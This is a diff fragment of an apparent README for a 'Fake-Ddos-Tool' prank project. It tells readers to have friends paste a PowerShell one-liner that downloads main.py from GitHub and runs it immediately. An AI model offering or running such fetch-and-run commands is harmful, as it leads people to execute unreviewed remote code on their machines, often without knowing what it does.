@@ -6,7 +6,6 @@
 
 1. Open PowerShell or Terminal
 2. ## Tell your friends to paste this:
-    # each row one by one in order:
    ```powershell
    powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/thecho0senone/Fake-Ddos-Tool/main/main.py' -OutFile 'main.py'; python main.py"
 ## That's literally all they have to do paste in that command.
